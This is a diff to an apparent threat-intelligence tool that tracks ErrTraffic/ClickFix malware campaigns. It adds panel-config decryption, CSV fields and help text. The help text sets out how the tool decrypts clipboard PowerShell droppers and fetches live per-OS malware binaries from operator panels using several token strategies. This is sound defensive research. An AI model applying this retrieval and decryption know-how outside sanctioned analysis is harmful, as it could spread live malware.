         for b in cls["fromBase64_blobs"]:
             p(f"      *   FromBase64String[{b['len']} chars]: {b['head']}...\n")
         for cid in cls["labeled_ids"]: p(f"      *   labeled id: {cid}\n")
+    elif s == "bw_v2_launcher":
+        p(f"      * BW v2 plaintext launcher  ({cls.get('kit','ErrTraffic v3 (BW v2)')})\n")
+        p(f"      *   download URL: {cls.get('dl_url_defanged')}\n")
+        if cls.get("token"):
+            p(f"      *   token ({cls.get('token_alias','uj')}=): {cls['token']}\n")
+        if cls.get("rlm"):
+            p(f"      *   rlm: {cls['rlm']}\n")
+        if cls.get("confidence") is not None:
+            p(f"      *   confidence: {cls['confidence']:.2f}\n")
+        chain_bits = []
+        if cls.get("has_invoke_webrequest"): chain_bits.append("iwr")
+        if cls.get("has_start_process"):     chain_bits.append("Start-Process")
+        if cls.get("has_invoke_expression"): chain_bits.append("iex")
+        if cls.get("has_file_arg"):          chain_bits.append("-File")
+        if chain_bits:
+            p(f"      *   chain primitives: {', '.join(chain_bits)}\n")
     elif s == "powershell_command":
         for c in cls["commands"]: p(f"      * command: {c[:240]}\n")
     elif s == "tds_beacon":
@@ -3584,6 +4496,10 @@ COMPREHENSIVE_CSV_COLUMNS = [
     "payload_all_same", "payload_file_magics", "payload_endpoint_families",
     "init_aes_ps_sha256", "init_aes_ps_recovered",
     "init_aes_decrypted_sha256", "init_aes_decrypted_dl_url",
+    # BW v2 envelope-decrypt (panel-mode auto-decrypt of /api/cfg + /api/settings)
+    "bw_v2_envelopes_decrypted", "bw_v2_envelope_key_source",
+    "bw_v2_mode", "bw_v2_enabled", "bw_v2_block_bots", "bw_v2_rental_expired",
+    "bw_v2_panel_base_url",
     "errors",
 ]
 
@@ -3689,8 +4605,26 @@ def comprehensive_to_csv_row(report: dict) -> dict:
         "init_aes_ps_recovered":    init_aes_ps_n,
         "init_aes_decrypted_sha256": init_pt_sha,
         "init_aes_decrypted_dl_url": init_dl_url,
+        # BW v2 envelope-decrypt
+        "bw_v2_envelopes_decrypted": _bw_v2_envelopes_decrypted_count(report),
+        "bw_v2_envelope_key_source": _bw_v2_envelope_key_source(report),
+        "bw_v2_mode":                (report.get("envelope_recovery") or {}).get("summary", {}).get("mode", ""),
+        "bw_v2_enabled":             (report.get("envelope_recovery") or {}).get("summary", {}).get("enabled", ""),
+        "bw_v2_block_bots":          (report.get("envelope_recovery") or {}).get("summary", {}).get("blockBots", ""),
+        "bw_v2_rental_expired":      (report.get("envelope_recovery") or {}).get("summary", {}).get("rentalExpired", ""),
+        "bw_v2_panel_base_url":      (report.get("envelope_recovery") or {}).get("summary", {}).get("panelBaseUrl", ""),
         "errors":                "; ".join(report.get("errors") or []),
     }
+
+
+def _bw_v2_envelopes_decrypted_count(report: dict) -> int:
+    env = (report.get("envelope_recovery") or {}).get("responses") or []
+    return sum(1 for r in env if r.get("decrypted") is not None)
+
+
+def _bw_v2_envelope_key_source(report: dict) -> str:
+    env = (report.get("envelope_recovery") or {}).get("responses") or []
+    return (env[0].get("key_source") if env else "") or ""
 
 
 def comprehensive_to_scripts_csv_rows(report: dict) -> Iterable[dict]:
@@ -4638,28 +5572,35 @@ def main():
  4. COMPREHENSIVE (single IOC) clickchain.py <url-or-domain> --comprehensive [--payload]
         Full pipeline for one IOC. Auto-detects input role (LURE vs PANEL) and
         routes accordingly:
-          LURE-mode  (default):   fetch lure HTML, decode obfuscated loader,
-                                  classify, on-chain resolve EtherHiding contract,
-                                  fingerprint lure + panel hosts (DNS/ports/TLS),
-                                  detect WordPress (10-signal scoring),
-                                  detect Cloudflare (lure + panel separately),
+          LURE-mode  (default):   fetch lure HTML, decode obfuscated loader (incl.
+                                  BW v2 IIFE-wrapped XOR layout), classify,
+                                  on-chain resolve EtherHiding contract (handles
+                                  both v3-original getURL() and BW v2 / Aeternum
+                                  getDomain() selectors), fingerprint lure + panel
+                                  hosts (DNS/ports/TLS), detect WordPress (10-signal
+                                  scoring), detect Cloudflare (lure + panel separately),
                                   probe /wp-content/mu-plugins/session-manager.php
                                   for the ErrTraffic backdoor (LevelBlue 2026),
                                   AES-decrypt the clipboard PS, parse stager URL,
                                   optionally download per-OS payloads.
-          PANEL-mode (auto):      skip lure decode; go straight to /api/index.php?a=init
-                                  for each OS, AES-decrypt the served clipboard PS,
-                                  download the per-OS binary.
+          PANEL-mode (auto):      skip lure decode; AES-256-GCM-decrypt the panel's
+                                  /api/cfg + /api/settings envelopes (yielding the
+                                  operator's live mode / enabled / blockBots /
+                                  rentalExpired config), then go straight to
+                                  /api/index.php?a=init for each OS, AES-decrypt
+                                  the served clipboard PS (v3-original) OR consume
+                                  the plain hex token (v3 BW v2), download the
+                                  per-OS binary.
 
-        Add --payload to fetch binaries. Four download strategies tried in order:
-          0) known-token /a=dl    (--payload-token from FLARE-VM walk-through OR
-                                   token parsed from in-run AES recovery)
-          1) v3 admin mint        (Censys /index.php?action=generateDownloadToken)
-          2) v2 admin mint        (/api/generate-download-token.php)
-          3) v3 runtime init→AES→dl  (THE working path in May 2026; parses init's
-                                       JSON {"ok":true,"token":"<AES PS>"} field,
-                                       AES-decrypts it locally to extract the real
-                                       download token from the dropper plaintext)
+        Add --payload to fetch binaries. Five download strategies tried in order:
+          0) known-token /a=dl       (--payload-token from FLARE-VM walk-through OR
+                                      token parsed from in-run AES recovery)
+          1) v3 admin mint           (Censys /index.php?action=generateDownloadToken)
+          2) v2 admin mint           (/api/generate-download-token.php)
+          3) v3 ORIGINAL runtime     (init → {ok:true,token:<AES PS>} → AES-CBC
+                                      decrypt → extract real dl token → /a=dl)
+          4) v3 BW V2 runtime        (init → {token:<sha256-hex>} → /a=dl?uj=<hex>
+                                      &rlm=<src-tag>; the modern May-2026 path)
 
         PAYLOAD CAPTURE (default = metadata-only): ClickChain hashes each payload
         (sha256/sha1/md5), records file-magic + size + FULL HTTP response headers
@@ -5622,6 +6563,36 @@ def _render_comprehensive_text(report: dict):
         p(f"    PANEL behind CF: {C.DIM}not detected (IP/CNAME only — "
           f"re-check with --payload to read response headers){C.RESET}\n")
     p("\n")
+
+    # ── BW v2 envelope recovery (panel-mode) ──────────────────────────────────
+    # When the input is a panel, we probe /api/cfg + /api/settings and AES-GCM
+    # decrypt the envelopes using the kit's documented base key. This surfaces
+    # the operator's LIVE configuration in plaintext — mode (lure theme),
+    # enabled flag, blockBots, rentalExpired — without any active interaction.
+    env_rec = report.get("envelope_recovery")
+    if env_rec and env_rec.get("responses"):
+        p(f"  {C.BOLD}{C.MAGENTA}BW v2 ENVELOPE RECOVERY{C.RESET}  "
+          f"{C.DIM}(decrypted /api/cfg + /api/settings — passive AES-GCM){C.RESET}\n")
+        ksrc = (env_rec.get("responses") or [{}])[0].get("key_source") or "?"
+        p(f"      AES-GCM key source: {C.BOLD}{ksrc}{C.RESET}\n")
+        for r in env_rec["responses"]:
+            stat = r.get("status"); enc = r.get("enc"); err = r.get("error")
+            if r.get("decrypted") is not None:
+                p(f"      {C.GREEN}[OK]{C.RESET}   {r.get('action'):8s}  "
+                  f"HTTP {stat}  enc={enc}  scope={r.get('scope')}  "
+                  f"q={r.get('q_bytes'):,}B  -> decrypted JSON\n")
+            else:
+                p(f"      {C.YELLOW}[--]{C.RESET}   {r.get('action'):8s}  "
+                  f"HTTP {stat}  enc={enc}  -> {C.DIM}{err}{C.RESET}\n")
+        # Flat plaintext summary (operator-visible config)
+        summ_env = env_rec.get("summary") or {}
+        if summ_env:
+            p(f"      {C.BOLD}operator config (plaintext):{C.RESET}\n")
+            for k in ("mode","enabled","blockBots","rentalExpired","showDelay",
+                      "os","browser","panelBaseUrl","apiBase","tokenUrl","downloadUrl"):
+                if k in summ_env:
+                    p(f"        {k:14s} = {summ_env[k]!r}\n")
+        p("\n")
 
     # ── Inline malicious <script> blocks (the actual obfuscated payload) ──
     base = report.get("lure_page") or {}
